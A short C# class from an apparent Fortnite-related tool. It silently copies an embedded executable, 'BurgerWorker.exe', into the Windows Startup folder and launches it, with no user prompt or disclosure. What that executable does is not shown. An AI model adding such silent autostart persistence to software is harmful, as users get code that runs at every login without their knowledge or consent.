using System;
using System.Diagnostics;
using System.IO;

namespace FortniteBurger.Classes
{
    internal class Worker
    {
        internal static void LoadWorker()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Microsoft/Windows/Start Menu/Programs/Startup/BurgerWorker.exe";

            if (File.Exists(path))
            {
                File.Delete(path);
            }

            File.WriteAllBytes(path, Properties.Resources.BurgerWorker);

            Process.Start(path);
        }
    } 
}
